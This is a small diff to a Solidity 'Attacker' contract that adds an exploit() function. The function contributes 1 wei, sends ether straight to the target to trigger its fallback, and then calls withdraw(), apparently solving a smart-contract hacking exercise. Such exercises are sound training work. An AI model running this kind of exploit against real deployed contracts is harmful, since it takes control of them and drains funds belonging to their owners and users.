@@ -20,5 +20,11 @@ contract Attacker {
 
     receive() external payable {}
 
-    function exploit() public payable {}
+    function exploit() public payable {
+        target.contribute{value: 1 wei}();
+        (bool success, bytes memory return_data) = payable(address(target))
+            .call{value: 1 wei}("");
+        require(success);
+        target.withdraw();
+    }
 }
